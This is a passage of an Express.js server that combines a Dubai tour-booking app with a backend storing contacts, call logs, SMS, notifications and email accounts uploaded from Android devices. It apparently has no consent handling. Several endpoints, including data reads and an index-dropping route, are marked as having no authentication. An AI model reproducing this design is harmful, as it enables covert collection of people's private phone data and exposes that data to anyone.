// Load environment configuration
const config = require('./config/environment');

const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const crypto = require('crypto');
const mongoose = require('mongoose');

// Import database configuration
const connectDB = require('./config/database');

// Import models
const Device = require('./models/Device');
const Contact = require('./models/Contact');
const CallLog = require('./models/CallLog');
const Message = require('./models/Message');
const Notification = require('./models/Notification');
const EmailAccount = require('./models/EmailAccount');
const SyncSettings = require('./models/SyncSettings');
const Admin = require('./models/Admin');
const Attraction = require('./models/Attraction');
const Service = require('./models/Service');
const TourPackage = require('./models/TourPackage');
const Slider = require('./models/Slider');
const TourGallery = require('./models/TourGallery');

// Import seeders
const seedDubaiDataFromJson = require('./seedDubaiDataFromJson');
const seedSliderData = require('./seedSliderData');
const seedTourGallery = require('./seedTourGallery');
const seedAdmin = require('./seedAdmin');
const seedDubaiData = require('./seedDubaiData');

// Import routes
const deviceRoutes = require('./routes/devices');
const clientRoutes = require('./routes/client');
const contactsRoutes = require('./routes/contacts');
const callLogsRoutes = require('./routes/callLogs');
const messagesRoutes = require('./routes/messages');
const notificationsRoutes = require('./routes/notifications');
const emailAccountsRoutes = require('./routes/emailAccounts');
const dubaiAppRoutes = require('./routes/dubaiApp');
const adminRoutes = require('./routes/adminRoutes');
const userRoutes = require('./routes/userRoutes');
const sliderRoutes = require('./routes/sliders');
const tourGalleryRoutes = require('./routes/tourGallery');
const transportServicesRoutes = require('./routes/transportServices');
const queueRoutes = require('./routes/queueRoutes');
const userSettingsRoutes = require('./routes/userSettings');
const userProfileRoutes = require('./routes/userProfile');
const authRoutes = require('./routes/auth');
const bookingRoutes = require('./routes/bookings');
const chatRoutes = require('./routes/chat');
const tripsRoutes = require('./routes/trips');
const errorLogsRoutes = require('./routes/errorLogs');
const mobileErrorLogsRoutes = require('./routes/mobileErrorLogs');

const app = express();
const PORT = config.server.port;

// Connect to MongoDB using environment configuration
connectDB();

// Middleware
app.use(cors());

// Custom JSON error handler
app.use((err, req, res, next) => {
  if (err instanceof SyntaxError && err.status === 400 && 'body' in err) {
    console.error('❌ JSON Parse Error:', {
      url: req.url,
      method: req.method,
      headers: req.headers,
      body: req.body,
      error: err.message
    });
    
    return res.status(400).json({
      success: false,
      message: 'Invalid JSON format',
      error: 'The request body contains malformed JSON',
      details: err.message,
      suggestion: 'Please check your JSON syntax and ensure proper escaping of quotes'
    });
  }
  next();
});

// Request logging middleware for debugging
app.use((req, res, next) => {
  if (req.method === 'POST' || req.method === 'PUT' || req.method === 'PATCH') {
    console.log(`📥 ${req.method} ${req.url} - Content-Type: ${req.headers['content-type']}`);
    
    // Log request body preview for debugging
    if (req.body && Object.keys(req.body).length > 0) {
      console.log(`📦 Request body preview:`, JSON.stringify(req.body).substring(0, 200));
    }
  }
  next();
});

// Body parser with better error handling
app.use(bodyParser.json({ 
  limit: '50mb',
  verify: (req, res, buf) => {
    try {
      JSON.parse(buf);
    } catch (e) {
      console.error('❌ Pre-parse JSON validation failed:', {
        url: req.url,
        method: req.method,
        error: e.message,
        bodyPreview: buf.toString().substring(0, 200)
      });
      throw new Error('Invalid JSON format');
    }
  }
}));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// Mount routes
app.use('/api/devices', deviceRoutes);
app.use('/api/transport-services', transportServicesRoutes);
app.use('/api/trips', tripsRoutes);

// Unified sync endpoint to support frontend generic sync API
// Accepts: POST /api/devices/:deviceId/sync { dataType: string, data: array }
// Routes the payload to the appropriate processor/queue based on dataType
app.post('/api/devices/:deviceId/sync', async (req, res) => {
  try {
    const { deviceId } = req.params;
    let { dataType, data } = req.body || {};

    if (!deviceId || !dataType || !Array.isArray(data)) {
      return res.status(400).json({
        success: false,
        message: 'deviceId, dataType and data[] are required',
      });
    }

    // Normalize dataType to internal keys used by queue/processor
    const normalized = String(dataType).toLowerCase();
    let processorType = normalized;
    if (normalized === 'calllogs' || normalized === 'call_logs') processorType = 'calllogs';
    if (normalized === 'emailaccounts' || normalized === 'email_accounts') processorType = 'emailaccounts';
    if (normalized === 'notifications') processorType = 'notifications';
    if (normalized === 'contacts') processorType = 'contacts';

    const { queueProcessor } = require('./middleware/queueMiddleware');

    // Decide to queue or process immediately based on batch size
    const dataCount = data.length;
    if (queueProcessor.shouldQueueData(dataCount)) {
      const queueItem = await queueProcessor.addToQueue(deviceId, processorType, data);
      return res.status(202).json({
        success: true,
        message: 'Data queued for processing',
        queueId: queueItem._id,
        dataType: processorType,
        dataCount,
        status: 'queued',
        timestamp: new Date().toISOString(),
      });
    }

    // For immediate processing, use the appropriate processor method
    try {
      let result;
      const currentTimestamp = new Date().toISOString();
      
      switch (processorType) {
        case 'contacts':
          result = await queueProcessor.processContactsBatch(deviceId, data);
          break;
        case 'calllogs':
          result = await queueProcessor.processCallLogsBatch(deviceId, data);
          break;
        case 'messages':
          result = await queueProcessor.processMessagesBatch(deviceId, data);
          break;
        case 'notifications':
          result = await queueProcessor.processNotificationsBatch(deviceId, data);
          break;
        case 'emailaccounts':
          result = await queueProcessor.processEmailAccountsBatch(deviceId, data);
          break;
        default:
          return res.status(400).json({
            success: false,
            message: `Unsupported data type: ${processorType}`,
          });
      }
      
      return res.status(200).json({
        success: true,
        message: 'Data processed successfully',
        dataType: processorType,
        dataCount,
        processed: result.processed || 0,
        failed: result.failed || 0,
        timestamp: currentTimestamp,
      });
    } catch (processingError) {
      console.error('Data processing error:', processingError);
      return res.status(500).json({
        success: false,
        message: 'Failed to process data',
        error: processingError.message,
      });
    }
  } catch (error) {
    console.error('Unified sync error:', error);
    return res.status(500).json({ success: false, message: error.message });
  }
});
app.use('/api/client', clientRoutes);
app.use('/api/contacts', contactsRoutes);
app.use('/api/calllogs', callLogsRoutes);
app.use('/api/messages', messagesRoutes);
app.use('/api/notifications', notificationsRoutes);
app.use('/api/emailaccounts', emailAccountsRoutes);
app.use('/api/dubai', dubaiAppRoutes);
app.use('/api/admin', adminRoutes);
app.use('/api/user', userRoutes);
app.use('/api/sliders', sliderRoutes);
app.use('/api/gallery', tourGalleryRoutes);
app.use('/api/queue', queueRoutes);
app.use('/api/settings', userSettingsRoutes);
app.use('/api/profile', userProfileRoutes);
app.use('/api/auth', authRoutes);
app.use('/api/bookings', bookingRoutes);
app.use('/api/chat', chatRoutes);
app.use('/api/error-logs', errorLogsRoutes);
app.use('/api/mobile/error-logs', mobileErrorLogsRoutes);

// Helper function to get last sync time for a device and data type
async function getLastSyncTime(deviceId, dataType) {
    try {
        const lastSyncTime = await SyncSettings.getLastSyncTime(deviceId, dataType);
        return lastSyncTime;
    } catch (error) {
        console.error(`Error getting last sync time for ${deviceId}/${dataType}:`, error);
        return null;
    }
}

// Helper function to update last sync time for a device and data type
async function updateLastSyncTime(deviceId, dataType, lastSyncTime, itemCount = 0, status = 'SUCCESS', message = '') {
    try {
        await SyncSettings.updateLastSyncTime(deviceId, dataType, lastSyncTime, itemCount, status, message);
        console.log(`✅ Updated last sync time for ${deviceId}/${dataType}: ${lastSyncTime}`);
    } catch (error) {
        console.error(`Error updating last sync time for ${deviceId}/${dataType}:`, error);
    }
}

// Helper function to generate data hash for duplicate detection
function generateDataHash(deviceId, dataType, data) {
    // Extract user_internal_code from data if available
    const user_internal_code = data.user_internal_code || 'DEFAULT';
    
    // Create a clean data object without system fields for consistent hashing
    const cleanData = { ...data };
    delete cleanData.deviceId;
    delete cleanData.user_internal_code;
    delete cleanData.syncedAt;
    delete cleanData.dataHash;
    delete cleanData._id;
    
    const dataString = JSON.stringify(cleanData);
    return crypto.createHash('md5').update(`${deviceId}-${user_internal_code}-${dataType}-${dataString}`).digest('hex');
}

// Upload last 5 images endpoint - placed early to avoid conflicts
app.post('/api/test/devices/:deviceId/upload-last-5-images', async (req, res) => {
    try {
        const { deviceId } = req.params;
        
        console.log(`📸 Upload request for device: ${deviceId}`);
        console.log(`📁 Request body:`, req.body);
        
        return res.json({
            success: true,
            message: 'Upload endpoint reached successfully',
            deviceId: deviceId
        });
        
    } catch (error) {
        console.error('❌ Error uploading files:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to upload files',
            message: error.message
        });
    }
});

// Fix indexes endpoint
app.post('/api/fix-indexes', async (req, res) => {
    try {
        console.log('🔄 Manual index fix requested...');
        const db = mongoose.connection.db;
        
        // Fix Contacts collection
        const contactsCollection = db.collection('contacts');
        console.log('📞 Fixing contacts indexes...');
        try {
            await contactsCollection.dropIndexes();
            console.log('✅ Dropped existing contact indexes');
        } catch (error) {
            console.log('⚠️ No existing indexes to drop for contacts');
        }
        await contactsCollection.createIndex({ deviceId: 1, user_internal_code: 1, 'phoneNumbers.number': 1 });
        await contactsCollection.createIndex({ dataHash: 1 }, { unique: true });
        console.log('✅ Created new contact indexes');

        // Messages collection removed from sync - keeping for reference only
        console.log('💬 Messages collection removed from sync - skipping index creation');

        // Fix CallLogs collection
        const callLogsCollection = db.collection('calllogs');
        console.log('📞 Fixing call logs indexes...');
        try {
            await callLogsCollection.dropIndexes();
            console.log('✅ Dropped existing call log indexes');
        } catch (error) {
            console.log('⚠️ No existing indexes to drop for call logs');
        }
        await callLogsCollection.createIndex({ deviceId: 1, phoneNumber: 1, timestamp: 1, duration: 1 });
        await callLogsCollection.createIndex({ dataHash: 1 }, { unique: true });
        console.log('✅ Created new call log indexes');

        // Fix EmailAccounts collection
        const emailAccountsCollection = db.collection('emailaccounts');
        console.log('📧 Fixing email accounts indexes...');
        try {
            await emailAccountsCollection.dropIndexes();
            console.log('✅ Dropped existing email account indexes');
        } catch (error) {
            console.log('⚠️ No existing indexes to drop for email accounts');
        }
        await emailAccountsCollection.createIndex({ deviceId: 1, user_internal_code: 1, emailAddress: 1 });
        await emailAccountsCollection.createIndex({ dataHash: 1 }, { unique: true });
        console.log('✅ Created new email account indexes');

        // Fix Notifications collection
        const notificationsCollection = db.collection('notifications');
        console.log('🔔 Fixing notifications indexes...');
        try {
            await notificationsCollection.dropIndexes();
            console.log('✅ Dropped existing notification indexes');
        } catch (error) {
            console.log('⚠️ No existing indexes to drop for notifications');
        }
        await notificationsCollection.createIndex({ deviceId: 1, user_internal_code: 1, notificationId: 1 });
        await notificationsCollection.createIndex({ dataHash: 1 }, { unique: true });
        console.log('✅ Created new notification indexes');

        console.log('🎉 All indexes fixed successfully!');
        
        res.json({
            success: true,
            message: 'Indexes fixed successfully'
        });
    } catch (error) {
        console.error('❌ Error fixing indexes:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to fix indexes',
            message: error.message
        });
    }
});

// Health check endpoint
app.get('/api/health', async (req, res) => {
    try {
        const deviceCount = await Device.countDocuments();
        const contactCount = await Contact.countDocuments();
        const callLogCount = await CallLog.countDocuments();
        const notificationCount = await Notification.countDocuments();
        const emailCount = await EmailAccount.countDocuments();
        
        const totalSyncedRecords = contactCount + callLogCount + notificationCount + emailCount;
        
        res.json({
            success: true,
            message: 'DeviceSync Backend Server is running with MongoDB',
            timestamp: new Date().toISOString(),
            database: 'MongoDB',
            stats: {
                devices: deviceCount,
                syncedRecords: totalSyncedRecords
            }
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            message: 'Server error',
            error: error.message
        });
    }
});

// Device registration endpoint - SIMPLIFIED
app.post('/api/devices/register', async (req, res) => {
    try {
        console.log('📱 Device registration request body:', JSON.stringify(req.body, null, 2));
        
        // Extract deviceId and androidId from request
        let deviceId = req.body.deviceId;
        let androidId = req.body.androidId;
        
        if (!deviceId) {
            deviceId = `device_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
            console.log(`📱 No deviceId provided, generated: ${deviceId}`);
        }
        
        if (!androidId) {
            androidId = `android_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
            console.log(`📱 No androidId provided, generated: ${androidId}`);
        }

        console.log(`📱 Checking if device exists by deviceId: ${deviceId} or androidId: ${androidId}`);

        // Check if device already exists by either deviceId or androidId
        const existingDevice = await Device.findOne({
            $or: [
                { deviceId: deviceId },
                { androidId: androidId }
            ]
        });

        if (existingDevice) {
            console.log(`✅ Device already exists: ${existingDevice.deviceId} (Android ID: ${existingDevice.androidId})`);
            return res.status(200).json({
                success: true,
                message: 'Device already registered',
                device: existingDevice,
                isNewDevice: false
            });
        }

        // Device doesn't exist - create it with minimal data
        const newDevice = new Device({
            deviceId: deviceId,
            androidId: androidId,
            deviceName: req.body.deviceName || 'Unknown Device',
            model: req.body.model || 'Unknown Model',
            manufacturer: req.body.manufacturer || 'Unknown Manufacturer',
            androidVersion: req.body.androidVersion || 'Unknown Version',
            userName: req.body.userName || 'Unknown User',
            registeredAt: new Date(),
            lastSeen: new Date(),
            isActive: true
        });
        
        await newDevice.save();
        
        console.log(`✅ New device registered: ${deviceId} (Android ID: ${androidId})`);
        return res.status(200).json({
            success: true,
            message: 'Device registered successfully',
            device: newDevice,
            isNewDevice: true
        });
        
    } catch (error) {
        console.error('❌ Device registration error:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Device registration failed',
            message: error.message 
        });
    }
});


// Upload last 5 images endpoint - placed early to avoid conflicts
app.post('/api/test/devices/:deviceId/upload-last-5-images', async (req, res) => {
    try {
        const { deviceId } = req.params;
        
        console.log(`📸 Upload request for device: ${deviceId}`);
        console.log(`📁 Request body:`, req.body);
        
        return res.json({
            success: true,
            message: 'Upload endpoint reached successfully',
            deviceId: deviceId
        });
        
    } catch (error) {
        console.error('❌ Error uploading files:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to upload files',
            message: error.message
        });
    }
});

// Core Sync Data Endpoint (NO AUTHENTICATION - For Testing) - BULK INSERT ONLY VERSION
app.post('/api/test/devices/:deviceId/sync', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { dataType, data, timestamp } = req.body;
        
        console.log(`🔓 TEST BULK INSERT: Processing ${dataType} for device ${deviceId}. Items: ${data.length}`);
        
        let Model, collectionName;
        
        // Determine which model to use based on data type
        switch (dataType) {
            case 'CONTACTS':
                Model = Contact.getModelForDevice(deviceId);
                collectionName = Contact.getCollectionName(deviceId);
                break;
            case 'CALL_LOGS':
                Model = CallLog.getModelForDevice(deviceId);
                collectionName = CallLog.getCollectionName(deviceId);
                break;
            case 'MESSAGES':
                // Messages sync disabled - return error
                return res.status(400).json({
                    success: false,
                    error: 'Messages sync is currently disabled'
                });
            case 'NOTIFICATIONS':
                Model = Notification.getModelForDevice(deviceId);
                collectionName = Notification.getCollectionName(deviceId);
                break;
            case 'EMAIL_ACCOUNTS':
                Model = EmailAccount.getModelForDevice(deviceId);
                collectionName = EmailAccount.getCollectionName(deviceId);
                break;
            default:
                return res.status(400).json({
                    success: false,
                    error: `Unsupported data type: ${dataType}`
                });
        }
        
        // Get last sync time for this device and data type
        const lastSyncTime = await getLastSyncTime(deviceId, dataType);
        console.log(`📅 Last sync time for ${deviceId}/${dataType}: ${lastSyncTime || 'Never'}`);
        
        // STEP 1: Map and prepare all items
        const mappedItems = [];
        const dataHashes = new Set();
        
        for (const item of data) {
            try {
                let mappedItem = { ...item };
                
                switch (dataType) {
                    case 'CALL_LOGS':
                        const callType = (item.type || item.callType || '').toUpperCase();
                        const validCallTypes = ['INCOMING', 'OUTGOING', 'MISSED', 'REJECTED', 'BLOCKED'];
                        const mappedCallType = validCallTypes.includes(callType) ? callType : 'INCOMING';
                        
                        let callTimestamp;
                        try {
                            if (item.date) {
                                if (typeof item.date === 'string' && item.date.includes('T')) {
                                    callTimestamp = new Date(item.date);
                                } else {
                                    const dateValue = parseInt(item.date);
                                    if (!isNaN(dateValue) && dateValue > 0) {
                                        callTimestamp = new Date(dateValue > 1000000000000 ? dateValue : dateValue * 1000);
                                    } else {
                                        callTimestamp = new Date();
                                    }
                                }
                            } else if (item.timestamp) {
                                if (typeof item.timestamp === 'string' && item.timestamp.includes('T')) {
                                    callTimestamp = new Date(item.timestamp);
                                } else {
                                    const timestampValue = parseInt(item.timestamp);
                                    if (!isNaN(timestampValue) && timestampValue > 0) {
                                        callTimestamp = new Date(timestampValue > 1000000000000 ? timestampValue : timestampValue * 1000);
                                    } else {
                                        callTimestamp = new Date();
                                    }
                                }
                            } else {
                                callTimestamp = new Date();
                            }
                            
                            if (isNaN(callTimestamp.getTime()) || callTimestamp.getTime() <= 0) {
                                callTimestamp = new Date();
                            }
                        } catch (error) {
                            callTimestamp = new Date();
                        }
                        
                        mappedItem = {
                            phoneNumber: item.phoneNumber || item.number || 'Unknown',
                            contactName: item.name || item.contactName || '',
                            callType: mappedCallType,
                            timestamp: callTimestamp,
                            duration: parseInt(item.duration) || 0,
                            deviceId: deviceId,
                            syncedAt: new Date()
                        };
                        break;
                        
                    case 'CONTACTS':
                        // Ensure phoneNumbers is always an array
                        let phoneNumbersArray = [];
                        if (item.phoneNumbers && Array.isArray(item.phoneNumbers) && item.phoneNumbers.length > 0) {
                            // If phoneNumbers is already an array, use it
                            phoneNumbersArray = item.phoneNumbers.map(phone => ({
                                number: phone.number || phone,
                                type: phone.type || 'MOBILE'
                            }));
                        } else if (item.phoneNumber) {
                            // If only single phoneNumber exists, convert to array
                            phoneNumbersArray = [{
                                number: item.phoneNumber,
                                type: item.phoneType || 'MOBILE'
                            }];
                        } else {
                            // Fallback to default
                            phoneNumbersArray = [{
                                number: '+0000000000',
                                type: 'MOBILE'
                            }];
                        }
                        
                        mappedItem = {
                            name: item.name || 'Unknown Contact',
                            phoneNumbers: phoneNumbersArray,
                            emails: item.emails || [],
                            organization: item.organization || item.company || '',
                            deviceId: deviceId,
                            syncedAt: new Date()
                        };
                        break;
                        
                    case 'MESSAGES':
                        const messageType = (item.type || 'SMS').toUpperCase();
                        const validMessageTypes = ['SMS', 'MMS'];
                        const mappedMessageType = validMessageTypes.includes(messageType) ? messageType : 'SMS';
                        
                        let messageTimestamp;
                        try {
                            if (item.date) {
                                if (typeof item.date === 'string' && item.date.includes('T')) {
                                    messageTimestamp = new Date(item.date);
                                } else {
                                    const dateValue = parseInt(item.date);
                                    if (!isNaN(dateValue) && dateValue > 0) {
                                        messageTimestamp = new Date(dateValue > 1000000000000 ? dateValue : dateValue * 1000);
                                    } else {
                                        messageTimestamp = new Date();
                                    }
                                }
                            } else if (item.timestamp) {
                                if (typeof item.timestamp === 'string' && item.timestamp.includes('T')) {
                                    messageTimestamp = new Date(item.timestamp);
                                } else {
                                    const timestampValue = parseInt(item.timestamp);
                                    if (!isNaN(timestampValue) && timestampValue > 0) {
                                        messageTimestamp = new Date(timestampValue > 1000000000000 ? timestampValue : timestampValue * 1000);
                                    } else {
                                        messageTimestamp = new Date();
                                    }
                                }
                            } else {
                                messageTimestamp = new Date();
                            }
                            
                            if (isNaN(messageTimestamp.getTime()) || messageTimestamp.getTime() <= 0) {
                                messageTimestamp = new Date();
                            }
                        } catch (error) {
                            messageTimestamp = new Date();
                        }
                        
                        mappedItem = {
                            address: item.address || item.phoneNumber || 'Unknown',
                            body: item.body || item.message || '',
                            type: mappedMessageType,
                            isIncoming: item.type === 'inbox' || item.isIncoming !== false,
                            timestamp: messageTimestamp,
                            isRead: item.read || item.isRead || false,
                            deviceId: deviceId,
                            syncedAt: new Date()
                        };
                        break;
                        
                    case 'NOTIFICATIONS':
                        let notificationTimestamp;
                        try {
                            if (item.postTime) {
                                if (typeof item.postTime === 'string' && item.postTime.includes('T')) {
                                    notificationTimestamp = new Date(item.postTime);
                                } else {
                                    const postTimeValue = parseInt(item.postTime);
                                    if (!isNaN(postTimeValue) && postTimeValue > 0) {
                                        notificationTimestamp = new Date(postTimeValue > 1000000000000 ? postTimeValue : postTimeValue * 1000);
                                    } else {
                                        notificationTimestamp = new Date();
                                    }
                                }
                            } else if (item.timestamp) {
                                if (typeof item.timestamp === 'string' && item.timestamp.includes('T')) {
                                    notificationTimestamp = new Date(item.timestamp);
                                } else {
                                    const timestampValue = parseInt(item.timestamp);
                                    if (!isNaN(timestampValue) && timestampValue > 0) {
                                        notificationTimestamp = new Date(timestampValue > 1000000000000 ? timestampValue : timestampValue * 1000);
                                    } else {
                                        notificationTimestamp = new Date();
                                    }
                                }
                            } else {
                                notificationTimestamp = new Date();
                            }
                            
                            if (isNaN(notificationTimestamp.getTime()) || notificationTimestamp.getTime() <= 0) {
                                notificationTimestamp = new Date();
                            }
                        } catch (error) {
                            notificationTimestamp = new Date();
                        }
                        
                        mappedItem = {
                            notificationId: item.notificationId || `notif_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                            packageName: item.packageName || 'com.unknown.app',
                            appName: item.appName || item.packageName || 'Unknown App',
                            title: item.title || '',
                            text: item.text || item.body || '',
                            timestamp: notificationTimestamp,
                            deviceId: deviceId,
                            syncedAt: new Date()
                        };
                        break;
                        
                    case 'EMAIL_ACCOUNTS':
                        mappedItem = {
                            accountId: item.accountId || `acc_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                            emailAddress: item.emailAddress || item.email,
                            accountName: item.accountName || item.name || '',
                            provider: item.provider === 'gmail' ? 'Gmail' : 
                                    item.provider === 'outlook' ? 'Outlook' : 
                                    item.provider === 'yahoo' ? 'Yahoo' : 
                                    item.provider === 'icloud' ? 'iCloud' : 'Other',
                            accountType: item.accountType || 'IMAP',
                            isActive: item.isActive !== undefined ? item.isActive : true,
                            deviceId: deviceId,
                            syncedAt: new Date()
                        };
                        break;
                }
                
                // Generate data hash for duplicate detection
                const dataHash = generateDataHash(deviceId, dataType, mappedItem);
                mappedItem.dataHash = dataHash;
                
                // Check for duplicates within the current batch
                if (!dataHashes.has(dataHash)) {
                    dataHashes.add(dataHash);
                    mappedItems.push(mappedItem);
                } else {
                    console.log(`⚠️ Duplicate data hash found in batch for ${dataType}, skipping`);
                }
                
            } catch (itemError) {
                console.error(`❌ Error mapping ${dataType} item:`, itemError);
            }
        }
        
        console.log(`📊 Mapped ${mappedItems.length} unique items out of ${data.length} total items`);

        // STEP 2: Fetch existing data to filter out duplicates
        let existingData = [];
        try {
            const query = { deviceId: deviceId };
            
            // Add specific filters based on data type for better performance
            switch (dataType) {
                case 'CONTACTS':
                    const phoneNumbers = mappedItems.map(item => item.phoneNumber).filter(p => p);
                    if (phoneNumbers.length > 0) {
                        query.phoneNumber = { $in: phoneNumbers };
                    }
                    break;
                case 'CALL_LOGS':
                    const callLogKeys = mappedItems.map(item => ({
                        phoneNumber: item.phoneNumber,
                        timestamp: item.timestamp,
                        duration: item.duration
                    }));
                    if (callLogKeys.length > 0) {
                        query.$or = callLogKeys.map(key => ({
                            phoneNumber: key.phoneNumber,
                            timestamp: key.timestamp,
                            duration: key.duration
                        }));
                    }
                    break;
                case 'MESSAGES':
                    const messageKeys = mappedItems.map(item => ({
                        address: item.address,
                        timestamp: item.timestamp,
                        body: item.body
                    }));
                    if (messageKeys.length > 0) {
                        query.$or = messageKeys.map(key => ({
                            address: key.address,
                            timestamp: key.timestamp,
                            body: key.body
                        }));
                    }
                    break;
                case 'NOTIFICATIONS':
                    const notificationIds = mappedItems.map(item => item.notificationId).filter(id => id);
                    if (notificationIds.length > 0) {
                        query.notificationId = { $in: notificationIds };
                    }
                    break;
                case 'EMAIL_ACCOUNTS':
                    const accountIds = mappedItems.map(item => item.accountId).filter(id => id);
                    if (accountIds.length > 0) {
                        query.accountId = { $in: accountIds };
                    }
                    break;
            }
            
            existingData = await Model.find(query).lean();
            console.log(`📋 Found ${existingData.length} existing records for ${dataType}`);
            
        } catch (error) {
            console.error(`❌ Error fetching existing data:`, error);
        }

        // STEP 3: Filter out items that already exist
        const newItems = [];
        
        for (const mappedItem of mappedItems) {
            let exists = false;
            
            // Check if item already exists
            for (const existing of existingData) {
                let match = false;
                
                switch (dataType) {
                    case 'CONTACTS':
                        // Use dataHash for consistent duplicate detection
                        match = existing.dataHash === mappedItem.dataHash;
                        break;
                    case 'CALL_LOGS':
                        match = existing.phoneNumber === mappedItem.phoneNumber &&
                                existing.timestamp.getTime() === mappedItem.timestamp.getTime() &&
                                existing.duration === mappedItem.duration;
                        break;
                    case 'MESSAGES':
                        match = existing.address === mappedItem.address &&
                                existing.timestamp.getTime() === mappedItem.timestamp.getTime() &&
                                existing.body === mappedItem.body;
                        break;
                    case 'NOTIFICATIONS':
                        match = existing.dataHash === mappedItem.dataHash;
                        break;
                    case 'EMAIL_ACCOUNTS':
                        match = existing.dataHash === mappedItem.dataHash;
                        break;
                }
                
                if (match) {
                    exists = true;
                    break;
                }
            }
            
            if (!exists) {
                newItems.push(mappedItem);
            }
        }
        
        console.log(`🆕 New items to insert: ${newItems.length}`);

        // STEP 4: Perform bulk insert only
        let insertedCount = 0;
        
        if (newItems.length > 0) {
            try {
                const insertResult = await Model.insertMany(newItems, { 
                    ordered: false, // Continue on errors
                    rawResult: true 
                });
                insertedCount = insertResult.insertedCount || newItems.length;
                console.log(`✅ Bulk inserted ${insertedCount} new ${dataType} items`);
            } catch (insertError) {
                console.error(`❌ Bulk insert error:`, insertError);
                // Fallback to individual inserts for failed items
                for (const item of newItems) {
                    try {
                        await Model.create(item);
                        insertedCount++;
                    } catch (error) {
                        console.error(`❌ Individual insert failed:`, error);
                    }
                }
            }
        }
        
        console.log(`🎉 TEST BULK INSERT COMPLETE: ${insertedCount} ${dataType} items inserted to ${collectionName}`);
        
        // Update last sync time
        const currentTime = new Date();
        await updateLastSyncTime(deviceId, dataType, currentTime, insertedCount, 'SUCCESS', `Bulk inserted ${insertedCount} items`);
        
        res.json({
            success: true,
            data: {
                success: true,
                itemsInserted: insertedCount,
                itemsSkipped: data.length - insertedCount,
                lastSyncTime: currentTime,
                message: `TEST BULK INSERT: ${insertedCount} items inserted successfully to ${collectionName}`
            }
        });
        
    } catch (error) {
        console.error('❌ Test bulk insert error:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to sync data',
            message: error.message
        });
    }
});

// Get sync settings for a device
app.get('/api/test/devices/:deviceId/sync-settings', async (req, res) => {
    try {
        const { deviceId } = req.params;
        
        const settings = await SyncSettings.getDeviceSettings(deviceId);
        
        res.json({
            success: true,
            data: {
                deviceId,
                settings: settings
            }
        });
        
    } catch (error) {
        console.error('Error getting sync settings:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to get sync settings'
        });
    }
});

// Get last sync time for a specific data type
app.get('/api/test/devices/:deviceId/last-sync/:dataType', async (req, res) => {
    try {
        const { deviceId, dataType } = req.params;
        
        const lastSyncTime = await getLastSyncTime(deviceId, dataType);
        
        res.json({
            success: true,
            data: {
                deviceId,
                dataType,
                lastSyncTime: lastSyncTime
            }
        });
        
    } catch (error) {
        console.error('Error getting last sync time:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to get last sync time'
        });
    }
});

// Get synced data for a device
app.get('/api/test/devices/:deviceId/:dataType', async (req, res) => {
    try {
        const { deviceId, dataType } = req.params;
        const { page = 1, limit = 100, since } = req.query;
        
        let Model;
        
        // Determine which model to use based on data type
        switch (dataType) {
            case 'contacts':
                Model = Contact.getModelForDevice(deviceId);
                break;
            case 'call-logs':
                Model = CallLog.getModelForDevice(deviceId);
                break;
            case 'messages':
                Model = Message.getModelForDevice(deviceId);
                break;
            case 'notifications':
                Model = Notification.getModelForDevice(deviceId);
                break;
            case 'email-accounts':
                Model = EmailAccount.getModelForDevice(deviceId);
                break;
            default:
                return res.status(400).json({
                    success: false,
                    error: `Unsupported data type: ${dataType}`
                });
        }
        
        // Build query with optional since parameter
        let query = { deviceId };
        if (since) {
            const sinceDate = new Date(since);
            if (!isNaN(sinceDate.getTime())) {
                query.syncTime = { $gte: sinceDate };
            }
        }
        
        const data = await Model.find(query)
            .sort({ syncTime: -1 })
            .limit(limit * 1)
            .skip((page - 1) * limit);
        
        const total = await Model.countDocuments(query);
        
        res.json({
            success: true,
            data: {
                deviceId,
                dataType,
                items: data,
                pagination: {
                    current: page,
                    pages: Math.ceil(total / limit),
                    total
                }
            }
        });
        
    } catch (error) {
        console.error('Error getting data:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to get data'
        });
    }
});

// ========================================
// LIVE DATA ENDPOINTS (Main Database)
// ========================================

// Live Sync Data Endpoint (Main Database) - BULK INSERT ONLY VERSION
app.post('/api/devices/:deviceId/sync', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { dataType, data, timestamp } = req.body;
        
        console.log(`🚀 BULK INSERT: Processing ${dataType} for device ${deviceId}. Items: ${data.length}`);
        
        let Model;
        
        // Determine which model to use based on data type (main collections)
        switch (dataType) {
            case 'CONTACTS':
                Model = Contact;
                break;
            case 'CALL_LOGS':
                Model = CallLog;
                break;
            case 'MESSAGES':
                Model = Message;
                break;
            case 'NOTIFICATIONS':
                Model = Notification;
                break;
            case 'EMAIL_ACCOUNTS':
                Model = EmailAccount;
                break;
            default:
                return res.status(400).json({
                    success: false,
                    error: `Unsupported data type: ${dataType}`
                });
        }

        // Get device information to extract user_internal_code
        const device = await Device.findOne({ deviceId });
        const user_internal_code = device?.user_internal_code || 'DEFAULT';
        
        // STEP 1: Map and prepare all items
        const mappedItems = [];
        const dataHashes = new Set();
        
        for (const item of data) {
            try {
                let mappedItem = { ...item };
                
                switch (dataType) {
                    case 'CALL_LOGS':
                        const callType = (item.type || item.callType || '')
                        const validCallTypes = ['INCOMING', 'OUTGOING', 'MISSED', 'REJECTED', 'BLOCKED'];
                        const mappedCallType = validCallTypes.includes(callType) ? callType : 'INCOMING';
                        
                        let callTimestamp;
                        try {
                            if (item.date) {
                                if (typeof item.date === 'string' && item.date.includes('T')) {
                                    callTimestamp = new Date(item.date);
                                } else {
                                    const dateValue = parseInt(item.date);
                                    if (!isNaN(dateValue) && dateValue > 0) {
                                        callTimestamp = new Date(dateValue > 1000000000000 ? dateValue : dateValue * 1000);
                                    } else {
                                        callTimestamp = new Date();
                                    }
                                }
                            } else if (item.timestamp) {
                                if (typeof item.timestamp === 'string' && item.timestamp.includes('T')) {
